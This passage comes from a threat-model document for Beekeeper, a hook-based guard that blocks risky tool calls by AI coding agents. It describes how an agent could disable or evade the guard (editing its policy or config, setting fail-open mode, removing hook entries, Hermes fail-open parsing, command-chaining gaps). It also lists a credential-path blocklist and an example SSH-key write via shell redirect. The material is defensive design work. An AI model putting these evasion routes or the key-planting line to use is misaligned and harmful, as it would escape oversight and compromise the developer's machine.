**Hook-protocol integrity fix:** `LoadPolicyDir`'s "skipping invalid policy file"
warning now goes to **stderr** (`internal/policyloader/enforce.go`), not stdout.
`beekeeper check` runs `LoadPolicyDir` on every hook call, so a foreign/invalid file in
`policies/` (e.g. a leftover `tui_rules.json`) previously risked emitting a stray stdout
line that could corrupt the hook's JSON/deny protocol. Regression-guarded by
`TestLoadPolicyDirNeverWritesStdout`.

### Self-Protection: Beekeeper's Own State, Binary, and Hook Entry

Beekeeper guards an agent that runs with the developer's full filesystem
permissions, so OS file permissions (0600) cannot stop the agent from tampering
with Beekeeper itself — the agent *is* the owner. The only layer that can tell
"this access is coming through the agent" is the tool-call hook, so `beekeeper
check` blocks the agent's tool calls that target Beekeeper's own footprint
(`internal/check/selfprotect.go`, `hookguard.go`; pure matcher
`internal/policy/selfpath.go`). Enforced in `beekeeper check` only (D-03), after
`ApplyPolicyOverlay` and before NUDGE, merged most-restrictive — so a
`package_allowlist` allow can never downgrade a self-protection block.

- **State directory (read + write).** The resolved `platform.StateDir()` prefix
  (config.json, policies/, audit/, catalogs/, quarantine/, baselines/,
  state.json) is treated as a secret: agent reads AND writes are blocked. This
  closes the policy-file-injection and config-tamper escalation paths above at
  their source — the agent cannot add a `package_allowlist` allow rule, set
  `fail_mode:open`, or truncate the audit log.
- **Binary (write).** The running executable is write-protected so the agent
  cannot overwrite the guard with a no-op. Reads are allowed; `go install`
  rebuilds from source and carries no binary-path token, so it is unaffected.
- **Hook entry (content-aware, no collateral).** Hook-config files are shared
  (e.g. `~/.claude/settings.json` also holds GSD and other tools' hooks), so the
  guard does NOT lock the file. Instead, for a write/edit targeting a hook-config
  file that currently contains Beekeeper's marker (`beekeeper check` /
  `beekeeper audit-record`), it inspects the proposed content and blocks ONLY when
  the change would remove that marker. Edits that touch other hooks — and edits to
  files without a Beekeeper entry — pass untouched. Bash rewrites of a
  Beekeeper-installed hook file are blocked conservatively (content not reliably
  inspectable).
- **CLI mutation.** The agent is blocked from invoking Beekeeper's mutating
  subcommands via Bash (`config set`, `hooks install`/`uninstall`, `protect
  install`/`uninstall`) — quote-aware, so a literal phrase inside a commit message
  is not a false positive. Read-only subcommands (`scan`, `policy list`, …) pass.

**Human channels are unaffected** (none pass through the agent tool-call hook):
editing the files directly, running `beekeeper` yourself in a terminal, the
`beekeeper dashboard --admin` policy editor, and `/config`. There is deliberately
**no in-band agent bypass** — an env var or flag the agent could also set would
defeat the protection.

**Fail-safe:** self-protection prefix resolution is best-effort; a resolver error
omits that prefix and never aborts the check (no fail-closed lockout). Beekeeper's
own reads of its config/policies are plain `os.ReadFile` and do not route through
the policy engine, so protecting the state dir cannot self-deadlock the guard.

**Bonus hardening:** the write-aware Bash extraction added for this feature
(`extractBashWriteTargets`) also feeds the credential sensitive-path blocklist,
closing a prior gap where an agent could write to `~/.ssh` etc. via a shell
redirect (`echo key >> ~/.ssh/authorized_keys`).

### Overlay Limitations: `release_age` and `lifecycle_script_allowlist` Not Enforced

The declarative policy overlay (`ApplyPolicyOverlay` in `internal/policyloader/enforce.go`)
enforces `package_allowlist` and `sensitive_path` rules from policy files against live
tool calls. However, **two rule types are NOT enforced by the overlay in v1:**

- `release_age` rules (minimum package age before install is permitted)
- `lifecycle_script_allowlist` rules (allowlist of lifecycle scripts permitted to run)

**Why:** These rule types require package publication age and lifecycle-script metadata
that is NOT present in a pure `policy.ToolCall`. The overlay evaluates only data
available in the tool call itself (package name/ecosystem, target path). Release age
requires a catalog or registry API lookup; lifecycle-script data is extracted during
catalog sync.

**Enforcement path in v1:** The engine's built-in release-age and lifecycle-script
policies (configured via catalog entries and `internal/config`) remain the enforcement
path for these rule types. Declarative policy files can declare `release_age` rules
for documentation and `policy test` dry-run context, but they do not affect live
`beekeeper check` decisions in v1.

**Future work:** A v2 overlay enhancement could pass catalog-side metadata (package
publish timestamp, lifecycle-script hash) into the overlay for these rule types.
Until then, `release_age` and `lifecycle_script_allowlist` in policy files are
informational only and must not be relied upon for enforcement.

---

## 10. Multi-Harness Hook Enforcement (v1.3.0)

A block decision is only worth as much as the harness's willingness to honor
it. Beekeeper's policy engine can return a perfectly correct "block," but if the
agent runtime ("harness") ignores it and runs the tool anyway, the user is not
protected. This section documents the **deny-delivery** trust boundary — the
contract between `beekeeper check` and each of the 15 supported harnesses — which
is new in v1.3.0 and was not covered by the v1.0.0 model.

### The exit-1 → exit-2 Protocol Bug and Fix

In the v1.0.0/v1.1.0 era, `beekeeper check` signalled a block by **exiting 1**.
This was a latent silent-allow defect: most agent harnesses treat exit 1 as a
*hook error* (which they ignore or warn about), and reserve **exit 2** for an
explicit deny. The hook fired and the block was audited, but the tool still ran.

v1.3.0 fixes this with a **universal exit-2 deny contract**: on a block,
`beekeeper check --hook <name>` exits **2**, writes the human-readable reason to
stderr, and emits the harness-specific deny JSON (below) to stdout. Exit 2 is
recognized as a deny by the broadest set of harnesses; the renderer falls back
to exit 2 + stderr for any unknown harness, so an unrecognized target **fails
closed** rather than silently allowing.

### Per-Harness Deny Contract Families

Harnesses do not agree on how a hook signals a block. `RenderDeny`
(`internal/check/deny_render.go`) is table-driven over the following families:

| Family | Harnesses | Deny mechanism |
|--------|-----------|----------------|
| Nested `hookSpecificOutput` | Claude Code, Codex, Augment, CodeBuddy, Qwen | exit 2 + stderr; OR stdout `hookSpecificOutput.permissionDecision:"deny"` |
| Gemini-native `decision` | Gemini CLI, Antigravity | exit 2; OR stdout `{"decision":"deny","reason":"..."}` |
| Cursor permission JSON | Cursor | exit 2; OR `{"permission":"deny","user_message":...,"agent_message":...}` (requires `failClosed:true` — Cursor is fail-OPEN by default) |
| Flat permission JSON | Copilot | exit 2; OR flat `{"permissionDecision":"deny",...}` |
| Cline cancel JSON | Cline | exit 2; OR `{"cancel":true,"errorMessage":"..."}` (macOS/Linux only) |
| Hermes fail-OPEN (JSON-only) | Hermes | stdout `{"action":"block","message":"..."}` ONLY — **exit codes ignored** |
| exit-2-only (no stdout JSON) | Windsurf, OpenCode, Kilo, Trae | exit 2 + stderr; deny carried by exit code / plugin throw / gateway |

### Hermes: the Fail-OPEN / JSON-only Deny Path and the Raw-Decision-JSON Leak

Hermes is the one harness that **ignores hook exit codes entirely**. The block
is carried *only* by emitting `{"action":"block","message":"..."}` (with a
non-empty message) as the first JSON object on stdout. This is structurally
fail-open: a timeout, a crash, or any non-JSON stdout makes Hermes allow the
call.

A subtle silent-allow bug existed here. In `--hook` mode, the check handler also
prints its own raw machine-readable decision (e.g. `{"Allow":false,...}`) to
stdout. For Hermes, that raw line **preceded** the deny JSON, so Hermes parsed
the *first* object — the raw decision — and (mis)interpreted it as an allow. The
fix (commit f315c81) is the **`RunCheckTo(io.Discard)` seam**: in `--hook` mode
the raw Decision JSON is written to `io.Discard` instead of stdout, so the only
thing Hermes sees on stdout is the rendered harness deny form. An empty reason is
also substituted with a non-empty sentinel so the required `message` field is
never blank.

This closes the *known* leak, but the Hermes block still rests entirely on
Hermes parsing stdout as documented — there is no exit-code backstop. This class
is listed as a known gap in §8.

### The Installer Trust Boundary (15 Per-Harness Config Writers)

`beekeeper hooks install --target <harness>` writes a hook entry into each
harness's own configuration file (`~/.claude`, `~/.cursor`, `~/.hermes`, …).
These installers run **with user privileges only — no escalation** — and follow
fail-closed file-handling discipline:

- **Merge-not-clobber:** the installer appends its hook entry only if absent; it
  never overwrites an existing config. Foreign hooks (e.g. a user's own Cline
  scripts) are preserved.
- **Per-target backup:** the original config is backed up (0600) before any
  write.
- **Atomic write:** changes are written to a temp file and `rename`d into place,
  so an interrupted install cannot leave a half-written config.
- **JSONC-safe:** configs that allow comments are parsed without corrupting
  them.

Cline is **macOS/Linux only** — its hook requires a Unix executable file, so the
Cline installer is guarded `//go:build !windows` and returns an explicit error
on Windows rather than writing a config that cannot work.

### Honest Support Ceiling: Tier 1 / 2 / 3

Beekeeper is honest about how much each harness can actually be protected. Only
**Claude Code** is *live-verified* on a real running harness (the hook was
confirmed to block a credential-read tool call and audit it). Every other
harness is implemented against published vendor documentation and validated by
contract-shape unit tests that assert the correct exit code and JSON — but those
tests **do not run a real harness**, and CI cannot verify that a given harness
actually honors the contract.

- **Tier 1 (full hook-block):** Claude Code (live-verified), plus Codex, Cursor,
  Augment, CodeBuddy, Qwen, Gemini CLI, Copilot, Antigravity, Windsurf
  (documented, not locally verified).
- **Tier 2 (hook-block with caveats):** Hermes (fail-OPEN), Cline (no Windows),
  OpenCode (plugin gaps — subagent/MCP).
- **Tier 3 (MCP gateway only — native tools UNGUARDED):** Kilo, Trae.

The full per-harness matrix, deny mechanisms, caveats, and source citations are
in **`docs/harness-support-matrix.md`**. The Tier-3 native-tool gap and the
Hermes fail-OPEN class are restated as known gaps in §8.

---

## 11. Runtime Hardening (v1.2.0): SPATH, CORR, NUDGE

v1.2.0 tightened the policy engine and added runtime sensitive-path enforcement.
These controls were not present in the v1.0.0 model.

### SPATH — Sensitive-Path Runtime Enforcement

Beekeeper now blocks agent reads of credential and secret paths that fall
outside the project working directory. The default blocklist
(`DefaultSensitivePaths`, `internal/policy/path.go`) covers paths such as
`~/.ssh`, `~/.aws`, `~/.cargo/credentials`, `.env` globs, and editor MCP config
directories (Cursor/Windsurf), with normalization for Windows alternate data
streams and trailing-dot tricks. In the Sentry, paths are normalized with
`filepath.ToSlash` so backslash paths from Windows ETW match the same rules.

**The merge-ordering invariant (most important property):** in the check
handler, the declarative policy overlay is applied **first**, and only then are
the SPATH (sensitive-path) and NUDGE (package-manager) blocks merged in, using
**most-restrictive-wins**. The practical guarantee is that a `package_allowlist`
`allow` escape hatch (§9) can **never downgrade a credential-read block or a
nudge block** — the allowlist can only relax the catalog/engine base decision,
which is computed before the SPATH/NUDGE merge. The same parity check runs in the
MCP gateway, so a tool call cannot escape SPATH by going through the gateway
instead of the hook.

### CORR — Per-Severity Corroboration and Anti-Poisoning Sanity Bounds

The §3 corroboration model (1 source → warn, 2 → block, 3+ → quarantine) is
extended with **per-severity thresholds**. A `critical`-severity catalog match
can escalate to a block at a lower source count than a low-severity one. Two
anti-poisoning guards protect this stronger escalation:

- **All-versions wildcard guard (ALL-not-ANY):** a per-severity override is only
  honored if *every* non-dissenting match is version-specific. A single injected
  all-versions wildcard (`version: "*"`) cannot, by itself, mask a real
  version-specific match and trigger escalation.
- **Degraded-source suppression:** when the catalog is marked unhealthy
  (`CatalogHealthy=false`), the per-severity overrides are suppressed and the
  engine falls back to the flat default thresholds.

> **Honesty note (audited 2026-06-05; updated post-remediation).**
>
> **Degraded-source escalation (TM-B-01, reassessed 2026-06-06 — by design):**
> `ResolveHealthy` gates per-severity escalation on the health of the **canonical
> bumblebee feed** — the only locally-synced, sanity-tracked source (the watch
> daemon writes a degradation flag only for bumblebee). This is intentional: OSV
> and Socket are per-request adapters that degrade to *no-match* (so they cannot
> drive escalation regardless of any "health" signal), and gating escalation on a
> transient OSV/Socket outage would suppress bumblebee's legitimate `critical`
> escalation — weakening true-positive detection, especially offline / on Windows.
> The "degraded source counts at most 0.5 toward corroboration" fractional weight
> once described in §3 is **not implemented, and not planned as a mechanical
> change**: it is a core decision-semantics change, and for *gross* feed poisoning
> it is already covered by the sanity-bound degradation suppression above, while
> *subtle* content-preserving single-entry tamper is the corroboration + signature
> layer's job (TM-B-07, §8). The residual is a *false-positive* single-source block
> on a `critical` entry from a tampered-but-not-sanity-tripping canonical feed — a
> coercion/DoS primitive, not a malicious-allow bypass. A prior change that made
> `ResolveHealthy` loop over all sources was reverted as a no-op (only bumblebee is
> ever present in `state.Sources`) whose comment implied a multi-source degradation
> model that does not exist.
>
> **Signature verification (TM-B-02, not yet remediated):** In the live decision
> path, a Bumblebee entry's "signed" status remains a **presence check**
> (`catalog_signature` is non-empty), **not** an Ed25519 verification — real
> cryptographic verification (`VerifySignatureWithKey`) is wired only for the
> `beekeeper-self` feed (§6). Production Bumblebee entries are already
> `Signed:false`, so the realistic primitive is a single tampered critical entry
> → single-source false-positive block, not a malicious-allow bypass. Wiring
> Ed25519 verification into the Bumblebee decision path remains tracked for
> remediation. These discrepancies are disclosed here rather than silently
> edited so the audit trail is honest.

### NUDGE — Package-Manager Hardening

NUDGE normalizes package-manager invocations (`pnpm`/`bun`/`yarn` → `npm`
semantics, plus `npm add`/`npm exec` verbs) so install/exec detection is not
trivially evaded by using an alternate front-end. The package-manager detector
that backs the soft "nudge" advisory is **fail-OPEN by design** — a slow or
erroring package manager is treated as "not installed" so a soft advisory never
blocks a legitimate install — and it execs only fixed argv with never-panic,
overflow-guarded file scanners.

**Known limitation (see §8 "Zero-Day Agent Tool-Call Semantics"):** install
*parsing* is fail-open for invocation forms the parser does not recognize.
Command-chaining (`&&`, `;`, `|`), leading environment-variable assignments
(`FOO=bar npm install …`), and package managers not in the table (e.g. `deno`,
`mvn`, `nuget`) parse as "no package identified" and are allowed by default
rather than blocked. SPATH credential-read detection runs independently of this
parser.

---

*This document was first published with the Beekeeper v1.0.0 release and has been
refreshed to cover v1.2.0 (Runtime Hardening) and v1.3.0 (Multi-Harness Hook
Enforcement). It will be updated again when new threats are identified or
mitigations change. For the vulnerability disclosure process, see
[SECURITY.md](../SECURITY.md).*
